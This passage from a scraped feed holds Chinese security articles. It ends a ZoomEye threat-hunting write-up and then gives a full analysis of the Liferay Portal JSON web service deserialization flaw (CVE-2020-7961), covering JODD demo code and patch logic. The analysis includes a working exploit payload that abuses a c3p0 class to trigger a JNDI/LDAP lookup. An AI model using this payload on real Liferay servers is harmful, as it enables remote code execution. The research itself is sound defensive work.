src=&#34;/icons/unknown.gif&#34; alt=&#34;[   ]&quot;&#38;gt;&#38;lt;/td&#38;gt;&#38;lt;td&#38;gt;&#38;lt; a href=&#34;doajksdlrfadk.tmp&#34;&#38;gt;doajksdlrfadk.tmp&#38;lt;/ a&#38;gt;&#38;lt;/td&#38;gt;&#38;lt;td align=&#34;right&#34;&#38;gt;2017-09-27 06:36  &#38;lt;/td&#38;gt;&#38;lt;td align=&#34;right&#34;&#38;gt;4.9K&#38;lt;/td&#38;gt;&#38;lt;td&#38;gt;&#160;&#38;lt;/td&#38;gt;&#38;lt;/tr&#38;gt;\n&#38;lt;tr&#38;gt;&#38;lt;td valign=&#34;top&#34;&#38;gt;&#38;lt; img src=&#34;/icons/unknown.gif&#34; alt=&#34;[   ]&quot;&#38;gt;&#38;lt;/td&#38;gt;&#38;lt;td&#38;gt;&#38;lt; a href=&#34;dvhrksdlfsadk.tmp&#34;&#38;gt;dvhrksdlfsadk.tmp&#38;lt;/ a&#38;gt;&#38;lt;/td&#38;gt;&#38;lt;td align=&#34;right&#34;&#38;gt;2017-09-27 06:38  &#38;lt;/td&#38;gt;&#38;lt;td align=&#34;right&#34;&#38;gt;4.9K&#38;lt;/td&#38;gt;&#38;lt;td&#38;gt;&#160;&#38;lt;/td&#38;gt;&#38;lt;/tr&#38;gt;\n&#38;lt;tr&#38;gt;&#38;lt;td valign=&#34;top&#34;&#38;gt;&#38;lt; img src=&#34;/icons/unknown.gif&#34; alt=&#34;[   ]&quot;&#38;gt;&#38;lt;/td&#38;gt;&#38;lt;td&#38;gt;&#38;lt; a href=&#34;vfajksdlfsadk.tmp&#34;&#38;gt;vfajksdlfsadk.tmp&#38;lt;/ a&#38;gt;&#38;lt;/td&#38;gt;&#38;lt;td align=&#34;right&#34;&#38;gt;2017-09-27 06:37  &#38;lt;/td&#38;gt;&#38;lt;td align=&#34;right&#34;&#38;gt;4.9K&#38;lt;/td&#38;gt;&#38;lt;td&#38;gt;&#160;&#38;lt;/td&#38;gt;&#38;lt;/tr&#38;gt;\n&#38;lt;tr&#38;gt;&#38;lt;td valign=&#34;top&#34;&#38;gt;&#38;lt; img src=&#34;/icons/unknown.gif&#34; alt=&#34;[   ]&quot;&#38;gt;&#38;lt;/td&#38;gt;&#38;lt;td&#38;gt;&#38;lt; a href=&#34;wget-log&#34;&#38;gt;wget-log&#38;lt;/ a&#38;gt;&#38;lt;/td&#38;gt;&#38;lt;td align=&#34;right&#34;&#38;gt;2017-09-20 07:24  &#38;lt;/td&#38;gt;&#38;lt;td align=&#34;right&#34;&#38;gt;572 &#38;lt;/td&#38;gt;&#38;lt;td&#38;gt;&#160;&#38;lt;/td&#38;gt;&#38;lt;/tr&#38;gt;\n   &#38;lt;tr&#38;gt;&#38;lt;th colspan=&#34;5&#34;&#38;gt;&#38;lt;hr&#38;gt;&#38;lt;/th&#38;gt;&#38;lt;/tr&#38;gt;\n&#38;lt;/table&#38;gt;\n&#38;lt;/body&#38;gt;&#38;lt;/html&#38;gt;</pre>\n\n\n\n<p>从这个banner数据里可以得出结论，这个跟第一个案例里目标明确的入侵后植入水坑不一样的是，这个应该是攻击者自主可控的服务器，从<code>doajksdlfsadk.tmp</code>这些文件命名方式及文件大小（都为4.9k）基本可以推断这个时间节点应该是攻击者进行攻击之前的实战演练！所以这个IP服务器一开始就是为了APT攻击做准备的，到被发现后就直接抛弃！</p>\n\n\n\n<h2 id=\"_1\">总结</h2>\n\n\n\n<p>网络空间搜索引擎采用主动探测方式在网络攻击威胁追踪上有很大的应用空间，也体现了历史数据的价值，通过时间线最终能复盘攻击者的攻击手段、目的及流程。最后感谢所有支持ZoomEye的朋友们，ZoomEye作为国际领先的网络空间测绘搜索引擎，我们一直在努力！</p>\n\n\n\n<hr class=\"wp-block-separator\" />\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg\" alt=\"Paper\" /></figure>\n\n\n\n<p>本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<a href=\"https://paper.seebug.org/1219/\">https://paper.seebug.org/1219/</a><br></p>\n","descriptionType":"html","publishedDate":"Fri, 31 Jul 2020 03:20:11 +0000","feedId":2536,"bgimg":"https://images.seebug.org/content/images/2020/05/0a56d95a-1927-4b33-b998-ec6315cb36a1.jpg-w331s","linkMd5":"46ed8d4650000d45c0ea25a3a8b571e6","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn54@2020_1/2020/08/24/21-14-50-676_b91b9c6d451078a1.webp","destWidth":2880,"destHeight":1509,"sourceBytes":175402,"destBytes":110826,"author":"叶霖 杨","articleImgCdnMap":{"https://images.seebug.org/content/images/2020/05/0a56d95a-1927-4b33-b998-ec6315cb36a1.jpg-w331s":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn54@2020_1/2020/08/24/21-14-50-676_b91b9c6d451078a1.webp","https://images.seebug.org/content/images/2020/05/9a7fbc7c-ccfc-4bc2-aca5-57a3a98f4642.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn12@2020_1/2020/08/24/21-14-59-179_d3e3f424642e08a9.webp","https://images.seebug.org/content/images/2020/05/9ab3dc59-053e-4cf1-8025-52c742ea4426.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn30@2020_2/2020/08/24/21-14-53-886_ffd12ab6e63358fe.webp","https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn7@2020_5/2020/08/24/21-15-00-499_446834a71d30acd0.webp"},"publishedOrCreatedDate":1598303688719},{"createdTime":"2020-08-25 05:14:48","updatedTime":"2020-08-25 05:14:48","title":"Liferay Portal Json Web Service 反序列化漏洞(CVE-2020-7961)","link":"https://blog.knownsec.com/?p=5031","description":"\n<p><strong>作者：Longofo@知道创宇404实验室</strong><br><strong>时间：2020年3月27日</strong><br><strong>英文版本：<a href=\"https://paper.seebug.org/1163/\">https://paper.seebug.org/1163/</a></strong></p>\n\n\n\n<p>之前在CODE WHITE上发布了一篇关于<a href=\"https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html\">Liferay Portal JSON Web Service RCE</a>的漏洞，之前是小伙伴在处理这个漏洞，后面自己也去看了。Liferay Portal对于JSON Web Service的处理，在6.1、6.2版本中使用的是&#160;<a href=\"http://flexjson.sourceforge.net/\">Flexjson库</a>，在7版本之后换成了<a href=\"https://jodd.org/json/\">Jodd Json</a>。</p>\n\n\n\n<p><strong>总结起来该漏洞就是：Liferay Portal提供了Json Web Service服务，对于某些可以调用的端点，如果某个方法提供的是Object参数类型，那么就能够构造符合Java Beans的可利用恶意类，传递构造好的json反序列化串，Liferay反序列化时会自动调用恶意类的setter方法以及默认构造方法</strong>。不过还有一些细节问题，感觉还挺有意思，作者文中那张向上查找图，想着idea也没提供这样方便的功能，应该是自己实现的查找工具，文中分析下Liferay使用JODD反序列化的情况。</p>\n\n\n\n<h4 id=\"jodd\">JODD序列化与反序列化</h4>\n\n\n\n<p>参考<a href=\"https://jodd.org/json/\">官方使用手册</a>，先看下JODD的直接序列化与反序列化：</p>\n\n\n\n<p>TestObject.java</p>\n\n\n\n<pre class=\"crayon-plain-tag\">package com.longofo;\n\nimport java.util.HashMap;\n\npublic class TestObject {\n    private String name;\n    private Object object;\n    private HashMap&#38;lt;String, String&#38;gt; hashMap;\n\n    public TestObject() {\n        System.out.println(&#34;TestObject default constractor call&#34;);\n    }\n\n    public String getName() {\n        System.out.println(&#34;TestObject getName call&#34;);\n        return name;\n    }\n\n    public void setName(String name) {\n        System.out.println(&#34;TestObject setName call&#34;);\n        this.name = name;\n    }\n\n    public Object getObject() {\n        System.out.println(&#34;TestObject getObject call&#34;);\n        return object;\n    }\n\n    public void setObject(Object object) {\n        System.out.println(&#34;TestObject setObject call&#34;);\n        this.object = object;\n    }\n\n    public HashMap&#38;lt;String, String&#38;gt; getHashMap() {\n        System.out.println(&#34;TestObject getHashMap call&#34;);\n        return hashMap;\n    }\n\n    public void setHashMap(HashMap&#38;lt;String, String&#38;gt; hashMap) {\n        System.out.println(&#34;TestObject setHashMap call&#34;);\n        this.hashMap = hashMap;\n    }\n\n    @Override\n    public String toString() {\n        return &#34;TestObject{&#34; +\n                &#34;name='&#34; + name + '\\'' +\n                &#34;, object=&#34; + object +\n                &#34;, hashMap=&#34; + hashMap +\n                '}';\n    }\n}</pre>\n\n\n\n<p>TestObject1.java</p>\n\n\n\n<pre class=\"crayon-plain-tag\">package com.longofo;\n\npublic class TestObject1 {\n    private String jndiName;\n\n    public TestObject1() {\n        System.out.println(&#34;TestObject1 default constractor call&#34;);\n    }\n\n    public String getJndiName() {\n        System.out.println(&#34;TestObject1 getJndiName call&#34;);\n        return jndiName;\n    }\n\n    public void setJndiName(String jndiName) {\n        System.out.println(&#34;TestObject1 setJndiName call&#34;);\n        this.jndiName = jndiName;\n//        Context context = new InitialContext();\n//        context.lookup(jndiName);\n    }\n}</pre>\n\n\n\n<p>Test.java</p>\n\n\n\n<pre class=\"crayon-plain-tag\">package com.longofo;\n\nimport jodd.json.JsonParser;\nimport jodd.json.JsonSerializer;\n\nimport java.util.HashMap;\n\npublic class Test {\n    public static void main(String[] args) {\n        System.out.println(&#34;test common usage&#34;);\n        test1Common();\n\n        System.out.println();\n        System.out.println();\n\n        System.out.println(&#34;test unsecurity usage&#34;);\n        test2Unsecurity();\n    }\n\n    public static void test1Common() {\n        TestObject1 testObject1 = new TestObject1();\n        testObject1.setJndiName(&#34;xxx&#34;);\n\n        HashMap hashMap = new HashMap&#38;lt;String, String&#38;gt;();\n        hashMap.put(&#34;aaa&#34;, &#34;bbb&#34;);\n\n        TestObject testObject = new TestObject();\n        testObject.setName(&#34;ccc&#34;);\n        testObject.setObject(testObject1);\n        testObject.setHashMap(hashMap);\n\n        JsonSerializer jsonSerializer = new JsonSerializer();\n        String json = jsonSerializer.deep(true).serialize(testObject);\n        System.out.println(json);\n        System.out.println(&#34;----------------------------------------&#34;);\n\n        JsonParser jsonParser = new JsonParser();\n        TestObject dtestObject = jsonParser.map(&#34;object&#34;, TestObject1.class).parse(json, TestObject.class);\n        System.out.println(dtestObject);\n    }\n\n    public static void test2Unsecurity() {\n        TestObject1 testObject1 = new TestObject1();\n        testObject1.setJndiName(&#34;xxx&#34;);\n\n        HashMap hashMap = new HashMap&#38;lt;String, String&#38;gt;();\n        hashMap.put(&#34;aaa&#34;, &#34;bbb&#34;);\n\n        TestObject testObject = new TestObject();\n        testObject.setName(&#34;ccc&#34;);\n        testObject.setObject(testObject1);\n        testObject.setHashMap(hashMap);\n\n        JsonSerializer jsonSerializer = new JsonSerializer();\n        String json = jsonSerializer.setClassMetadataName(&#34;class&#34;).deep(true).serialize(testObject);\n        System.out.println(json);\n        System.out.println(&#34;----------------------------------------&#34;);\n\n        JsonParser jsonParser = new JsonParser();\n        TestObject dtestObject = jsonParser.setClassMetadataName(&#34;class&#34;).parse(json);\n        System.out.println(dtestObject);\n    }\n}</pre>\n\n\n\n<p>输出：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">test common usage\nTestObject1 default constractor call\nTestObject1 setJndiName call\nTestObject default constractor call\nTestObject setName call\nTestObject setObject call\nTestObject setHashMap call\nTestObject getHashMap call\nTestObject getName call\nTestObject getObject call\nTestObject1 getJndiName call\n{&#34;hashMap&#34;:{&#34;aaa&#34;:&#34;bbb&#34;},&#34;name&#34;:&#34;ccc&#34;,&#34;object&#34;:{&#34;jndiName&#34;:&#34;xxx&#34;}}\n----------------------------------------\nTestObject default constractor call\nTestObject setHashMap call\nTestObject setName call\nTestObject1 default constractor call\nTestObject1 setJndiName call\nTestObject setObject call\nTestObject{name='ccc', object=com.longofo.TestObject1@6fdb1f78, hashMap={aaa=bbb}}\n\n\ntest unsecurity usage\nTestObject1 default constractor call\nTestObject1 setJndiName call\nTestObject default constractor call\nTestObject setName call\nTestObject setObject call\nTestObject setHashMap call\nTestObject getHashMap call\nTestObject getName call\nTestObject getObject call\nTestObject1 getJndiName call\n{&#34;class&#34;:&#34;com.longofo.TestObject&#34;,&#34;hashMap&#34;:{&#34;aaa&#34;:&#34;bbb&#34;},&#34;name&#34;:&#34;ccc&#34;,&#34;object&#34;:{&#34;class&#34;:&#34;com.longofo.TestObject1&#34;,&#34;jndiName&#34;:&#34;xxx&#34;}}\n----------------------------------------\nTestObject1 default constractor call\nTestObject1 setJndiName call\nTestObject default constractor call\nTestObject setHashMap call\nTestObject setName call\nTestObject setObject call\nTestObject{name='ccc', object=com.longofo.TestObject1@65e579dc, hashMap={aaa=bbb}}</pre>\n\n\n\n<p>在Test.java中，使用了两种方式，第一种是常用的使用方式，在反序列化时指定根类型（rootType）；而第二种官方也不推荐这样使用，存在安全问题，假设某个应用提供了接收JODD Json的地方，并且使用了第二种方式，那么就可以任意指定类型进行反序列化了，不过Liferay这个漏洞给并不是这个原因造成的，它并没有使用setClassMetadataName(\"class\")这种方式。</p>\n\n\n\n<h4 id=\"liferayjodd\">Liferay对JODD的包装</h4>\n\n\n\n<p>Liferay没有直接使用JODD进行处理，而是重新包装了JODD一些功能。代码不长，所以下面分别分析下Liferay对JODD的JsonSerializer与JsonParser的包装。</p>\n\n\n\n<h5 id=\"jsonserializerimpl\">JSONSerializerImpl</h5>\n\n\n\n<p>Liferay对JODD JsonSerializer的包装是<code>com.liferay.portal.json.JSONSerializerImpl</code>类：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">public class JSONSerializerImpl implements JSONSerializer {\n    private final JsonSerializer _jsonSerializer;//JODD的JsonSerializer，最后还是交给了JODD的JsonSerializer去处理，只不过包装了一些额外的设置\n\n    public JSONSerializerImpl() {\n        if (JavaDetector.isIBM()) {//探测JDK\n            SystemUtil.disableUnsafeUsage();//和Unsafe类的使用有关\n        }\n\n        this._jsonSerializer = new JsonSerializer();\n    }\n\n    public JSONSerializerImpl exclude(String... fields) {\n        this._jsonSerializer.exclude(fields);//排除某个field不序列化\n        return this;\n    }\n\n    public JSONSerializerImpl include(String... fields) {\n        this._jsonSerializer.include(fields);//包含某个field进行序列化\n        return this;\n    }\n\n    public String serialize(Object target) {\n        return this._jsonSerializer.serialize(target);//调用JODD的JsonSerializer进行序列化\n    }\n\n    public String serializeDeep(Object target) {\n        JsonSerializer jsonSerializer = this._jsonSerializer.deep(true);//设置了deep后能序列化任意类型的field，包括集合等类型\n        return jsonSerializer.serialize(target);\n    }\n\n    public JSONSerializerImpl transform(JSONTransformer jsonTransformer, Class&#38;lt;?&#38;gt; type) {//设置转换器，和下面的设置全局转换器类似，不过这里可以传入自定义的转换器（比如将某个类的Data field，格式为03/27/2020，序列化时转为2020-03-27）\n        TypeJsonSerializer&#38;lt;?&#38;gt; typeJsonSerializer = null;\n        if (jsonTransformer instanceof TypeJsonSerializer) {\n            typeJsonSerializer = (TypeJsonSerializer)jsonTransformer;\n        } else {\n            typeJsonSerializer = new JoddJsonTransformer(jsonTransformer);\n        }\n\n        this._jsonSerializer.use(type, (TypeJsonSerializer)typeJsonSerializer);\n        return this;\n    }\n\n    public JSONSerializerImpl transform(JSONTransformer jsonTransformer, String field) {\n        TypeJsonSerializer&#38;lt;?&#38;gt; typeJsonSerializer = null;\n        if (jsonTransformer instanceof TypeJsonSerializer) {\n            typeJsonSerializer = (TypeJsonSerializer)jsonTransformer;\n        } else {\n            typeJsonSerializer = new JoddJsonTransformer(jsonTransformer);\n        }\n\n        this._jsonSerializer.use(field, (TypeJsonSerializer)typeJsonSerializer);\n        return this;\n    }\n\n    static {\n        //全局注册，对于所有Array、Object、Long类型的数据，在序列化时都进行转换单独的转换处理\n        JoddJson.defaultSerializers.register(JSONArray.class, new JSONSerializerImpl.JSONArrayTypeJSONSerializer());\n        JoddJson.defaultSerializers.register(JSONObject.class, new JSONSerializerImpl.JSONObjectTypeJSONSerializer());\n        JoddJson.defaultSerializers.register(Long.TYPE, new JSONSerializerImpl.LongToStringTypeJSONSerializer());\n        JoddJson.defaultSerializers.register(Long.class, new JSONSerializerImpl.LongToStringTypeJSONSerializer());\n    }\n\n    private static class LongToStringTypeJSONSerializer implements TypeJsonSerializer&#38;lt;Long&#38;gt; {\n        private LongToStringTypeJSONSerializer() {\n        }\n\n        public void serialize(JsonContext jsonContext, Long value) {\n            jsonContext.writeString(String.valueOf(value));\n        }\n    }\n\n    private static class JSONObjectTypeJSONSerializer implements TypeJsonSerializer&#38;lt;JSONObject&#38;gt; {\n        private JSONObjectTypeJSONSerializer() {\n        }\n\n        public void serialize(JsonContext jsonContext, JSONObject jsonObject) {\n            jsonContext.write(jsonObject.toString());\n        }\n    }\n\n    private static class JSONArrayTypeJSONSerializer implements TypeJsonSerializer&#38;lt;JSONArray&#38;gt; {\n        private JSONArrayTypeJSONSerializer() {\n        }\n\n        public void serialize(JsonContext jsonContext, JSONArray jsonArray) {\n            jsonContext.write(jsonArray.toString());\n        }\n    }\n}</pre>\n\n\n\n<p>能看出就是设置了JODD JsonSerializer在序列化时的一些功能。</p>\n\n\n\n<h5 id=\"jsondeserializerimpl\">JSONDeserializerImpl</h5>\n\n\n\n<p>Liferay对JODD JsonParser的包装是<code>com.liferay.portal.json.JSONDeserializerImpl</code>类：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">public class JSONDeserializerImpl&#38;lt;T&#38;gt; implements JSONDeserializer&#38;lt;T&#38;gt; {\n    private final JsonParser _jsonDeserializer;//JsonParser，反序列化最后还是交给了JODD的JsonParser去处理，JSONDeserializerImpl包装了一些额外的设置\n\n    public JSONDeserializerImpl() {\n        if (JavaDetector.isIBM()) {//探测JDK\n            SystemUtil.disableUnsafeUsage();//和Unsafe类的使用有关\n        }\n\n        this._jsonDeserializer = new PortalJsonParser();\n    }\n\n    public T deserialize(String input) {\n        return this._jsonDeserializer.parse(input);//调用JODD的JsonParser进行反序列化\n    }\n\n    public T deserialize(String input, Class&#38;lt;T&#38;gt; targetType) {\n        return this._jsonDeserializer.parse(input, targetType);//调用JODD的JsonParser进行反序列化，可以指定根类型（rootType）\n    }\n\n    public &#38;lt;K, V&#38;gt; JSONDeserializer&#38;lt;T&#38;gt; transform(JSONDeserializerTransformer&#38;lt;K, V&#38;gt; jsonDeserializerTransformer, String field) {//反序列化时使用的转换器\n        ValueConverter&#38;lt;K, V&#38;gt; valueConverter = new JoddJsonDeserializerTransformer(jsonDeserializerTransformer);\n        this._jsonDeserializer.use(field, valueConverter);\n        return this;\n    }\n\n    public JSONDeserializer&#38;lt;T&#38;gt; use(String path, Class&#38;lt;?&#38;gt; clazz) {\n        this._jsonDeserializer.map(path, clazz);//为某个field指定具体的类型，例如file在某个类是接口或Object等类型，在反序列化时指定具体的\n        return this;\n    }\n}</pre>\n\n\n\n<p>能看出也是设置了JODD JsonParser在反序列化时的一些功能。</p>\n\n\n\n<h4 id=\"liferay\">Liferay 漏洞分析</h4>\n\n\n\n<p>Liferay在<code>/api/jsonws</code>&#160;API提供了几百个可以调用的Webservice，负责处理的该API的Servlet也直接在web.xml中进行了配置：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/03/f59369d8-417c-45b6-a730-b75882e39e43.png-w331s\" alt=\"\" /></figure>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/03/0b8135c6-cceb-407e-bd75-4abf2ca8a617.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>随意点一个方法看看：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/03/781b4ffe-8a4e-4f91-9bfb-e5695589bb7a.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>看到这个有点感觉了，可以传递参数进行方法调用，有个p_auth是用来验证的，不过反序列化在验证之前，所以那个值对漏洞利用没影响。根据CODE WHITE那篇分析，是存在参数类型为Object的方法参数的，那么猜测可能可以传入任意类型的类。可以先正常的抓包调用去调试下，这里就不写正常的调用调试过程了，简单看一下post参数：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">cmd={&#34;/announcementsdelivery/update-delivery&#34;:{}}&#38;amp;p_auth=cqUjvUKs&#38;amp;formDate=1585293659009&#38;amp;userId=11&#38;amp;type=11&#38;amp;email=true&#38;amp;sms=true</pre>\n\n\n\n<p>总的来说就是<strong>Liferay先查找<code>/announcementsdelivery/update-delivery</code>对应的方法-&#62;其他post参数参都是方法的参数-&#62;当每个参数对象类型与与目标方法参数类型一致时-&#62;恢复参数对象-&#62;利用反射调用该方法</strong>。</p>\n\n\n\n<p>但是抓包并没有类型指定，因为大多数类型是String、long、int、List、map等类型，JODD反序列化时会自动处理。但是对于某些接口/Object类型的field，如果要指定具体的类型，该怎么指定？</p>\n\n\n\n<p>作者文中提到，Liferay Portal 7中只能显示指定rootType进行调用，从上面Liferay对JODD JSONDeserializerImpl包装来看也是这样。如果要恢复某个方法参数是Object类型时具体的对象，那么Liferay本身可能会先对数据进行解析，获取到指定的类型，然后调用JODD的parse(path,class)方法，传递解析出的具体类型来恢复这个参数对象；也有可能Liferay并没有这样做。不过从作者的分析中可以看出，Liferay确实这样做了。作者查找了<code>jodd.json.Parser#rootType</code>的调用图（羡慕这样的工具）：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/03/48e5f32e-6812-4839-9e18-fc2c3a76cd7e.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>通过向上查找的方式，作者找到了可能存在能指定根类型的地方，在<code>com.liferay.portal.jsonwebservice.JSONWebServiceActionImpl#JSONWebServiceActionImpl</code>调用了<code>com.liferay.portal.kernel.JSONFactoryUtil#looseDeserialize(valueString, parameterType)</code>, looseDeserialize调用的是JSONSerializerImpl，JSONSerializerImpl调用的是<code>JODD的JsonParse.parse</code>。</p>\n\n\n\n<p><code>com.liferay.portal.jsonwebservice.JSONWebServiceActionImpl#JSONWebServiceActionImpl</code>再往上的调用就是Liferay解析Web Service参数的过程了。它的上一层<code>JSONWebServiceActionImpl#_prepareParameters(Class&#60;?&#62;)</code>，JSONWebServiceActionImpl类有个<code>_jsonWebServiceActionParameters</code>属性：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/03/58811221-0dd8-44a4-80af-d6d737edf79e.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>这个属性中又保存着一个<code>JSONWebServiceActionParametersMap</code>，在它的put方法中，当参数以<code>+</code>开头时，它的put方法以<code>:</code>分割了传递的参数,<code>:</code>之前是参数名,<code>:</code>之后是类型名。</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/03/014b8782-9bb1-4341-9bf4-ba699e42f861.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>而put解析的操作在<code>com.liferay.portal.jsonwebservice.action.JSONWebServiceInvokerAction#_executeStatement</code>中完成：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/03/534c4fbf-6deb-4a8d-ad1a-137a36b3ecec.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>通过上面的分析与作者的文章，我们能知道以下几点：</p>\n\n\n\n<ul><li>Liferay 允许我们通过/api/jsonws/xxx调用Web Service方法</li><li>参数可以以+开头，用<code>:</code>指定参数类型</li><li>JODD JsonParse会调用类的默认构造方法，以及field对应的setter方法</li></ul>\n\n\n\n<p>所以需要找在setter方法中或默认构造方法中存在恶意操作的类。去看下marshalsec已经提供的利用链，可以直接找Jackson、带Yaml的，看他们继承的利用链，大多数也适合这个漏洞，同时也要看在Liferay中是否存在才能用。这里用<code>com.mchange.v2.c3p0.JndiRefForwardingDataSource</code>这个测试，用<code>/expandocolumn/add-column</code>这个Service，因为他有<code>java.lang.Object</code>参数：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/03/7c68ef39-f0d4-4a10-9fde-be772c0b7705.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>Payload如下：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">cmd={&#34;/expandocolumn/add-column&#34;:{}}&#38;amp;p_auth=Gyr2NhlX&#38;amp;formDate=1585307550388&#38;amp;tableId=1&#38;amp;name=1&#38;amp;type=1&#38;amp;+defaultData:com.mchange.v2.c3p0.JndiRefForwardingDataSource={&#34;jndiName&#34;:&#34;ldap://127.0.0.1:1389/Object&#34;,&#34;loginTimeout&#34;:0}</pre>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/03/3b8db5fd-e1a2-479f-af17-0bc7810d93e0.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>解析出了参数类型，并进行参数对象反序列化，最后到达了jndi查询：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/03/0ac16cfa-dc69-4e99-aa5a-1dfe99d2df1f.png-w331s\" alt=\"\" /></figure>\n\n\n\n<h4 id=\"_1\">补丁分析</h4>\n\n\n\n<p>Liferay补丁增加了类型校验，在<code>com.liferay.portal.jsonwebservice.JSONWebServiceActionImpl#_checkTypeIsAssignable</code>中：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/03/a3551846-8a48-4b31-9a7d-8669d86c940b.png-w331s\" alt=\"\" /></figure>\n\n\n\n<pre class=\"crayon-plain-tag\">private void _checkTypeIsAssignable(int argumentPos, Class&#38;lt;?&#38;gt; targetClass, Class&#38;lt;?&#38;gt; parameterType) {\n        String parameterTypeName = parameterType.getName();\n        if (parameterTypeName.contains(&#34;com.liferay&#34;) &#38;amp;&#38;amp; parameterTypeName.contains(&#34;Util&#34;)) {//含有com.liferay与Util非法\n            throw new IllegalArgumentException(&#34;Not instantiating &#34; + parameterTypeName);\n        } else if (!Objects.equals(targetClass, parameterType)) {//targetClass与parameterType不匹配时进入下一层校验\n            if (!ReflectUtil.isTypeOf(parameterType, targetClass)) {//parameterType是否是targetClass的子类\n                throw new IllegalArgumentException(StringBundler.concat(new Object[]{&#34;Unmatched argument type &#34;, parameterTypeName, &#34; for method argument &#34;, argumentPos}));\n            } else if (!parameterType.isPrimitive()) {//parameterType不是基本类型是进入下一层校验\n                if (!parameterTypeName.equals(this._jsonWebServiceNaming.convertModelClassToImplClassName(targetClass))) {//注解校验\n                    if (!ArrayUtil.contains(_JSONWS_WEB_SERVICE_PARAMETER_TYPE_WHITELIST_CLASS_NAMES, parameterTypeName)) {//白名单校验，白名单类在_JSONWS_WEB_SERVICE_PARAMETER_TYPE_WHITELIST_CLASS_NAMES中\n                        ServiceReference&#38;lt;Object&#38;gt;[] serviceReferences = _serviceTracker.getServiceReferences();\n                        if (serviceReferences != null) {\n                            String key = &#34;jsonws.web.service.parameter.type.whitelist.class.names&#34;;\n                            ServiceReference[] var7 = serviceReferences;\n                            int var8 = serviceReferences.length;\n\n                            for(int var9 = 0; var9 &#38;lt; var8; ++var9) {\n                                ServiceReference&#38;lt;Object&#38;gt; serviceReference = var7[var9];\n                                List&#38;lt;String&#38;gt; whitelistedClassNames = StringPlus.asList(serviceReference.getProperty(key));\n                                if (whitelistedClassNames.contains(parameterTypeName)) {\n                                    return;\n                                }\n                            }\n                        }\n\n                        throw new TypeConversionException(parameterTypeName + &#34; is not allowed to be instantiated&#34;);\n                    }\n                }\n            }\n        }\n    }</pre>\n\n\n\n<p><code>_JSONWS_WEB_SERVICE_PARAMETER_TYPE_WHITELIST_CLASS_NAMES</code>所有白名单类在portal.properties中，有点长就不列出来了，基本都是以<code>com.liferay</code>开头的类。</p>\n\n\n\n<hr class=\"wp-block-separator\" />\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg\" alt=\"Paper\" /></figure>\n\n\n\n<p>本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<a href=\"https://paper.seebug.org/1162/\">https://paper.seebug.org/1162/</a><br></p>\n","descriptionType":"html","publishedDate":"Fri, 31 Jul 2020 03:38:13 +0000","feedId":2536,"bgimg":"https://images.seebug.org/content/images/2020/03/f59369d8-417c-45b6-a730-b75882e39e43.png-w331s","linkMd5":"4b26291a0ec99cf126b9bcc0d9c59c35","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn33@2020_2/2020/08/24/21-14-51-063_ec47a57a2bd6a5fb.webp","destWidth":873,"destHeight":78,"sourceBytes":22795,"destBytes":8432,"author":"叶霖 杨","articleImgCdnMap":{"https://images.seebug.org/content/images/2020/03/f59369d8-417c-45b6-a730-b75882e39e43.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn33@2020_2/2020/08/24/21-14-51-063_ec47a57a2bd6a5fb.webp","https://images.seebug.org/content/images/2020/03/0b8135c6-cceb-407e-bd75-4abf2ca8a617.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn78@2020_5/2020/08/24/21-14-57-169_fcc12e219274ddfb.webp","https://images.seebug.org/content/images/2020/03/781b4ffe-8a4e-4f91-9bfb-e5695589bb7a.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn76@2020_1/2020/08/24/21-14-58-957_63521f4f4892f75a.webp","https://images.seebug.org/content/images/2020/03/48e5f32e-6812-4839-9e18-fc2c3a76cd7e.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn1@2020_3/2020/08/24/21-14-54-985_a5ea29f1cd3f4b10.webp","https://images.seebug.org/content/images/2020/03/58811221-0dd8-44a4-80af-d6d737edf79e.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx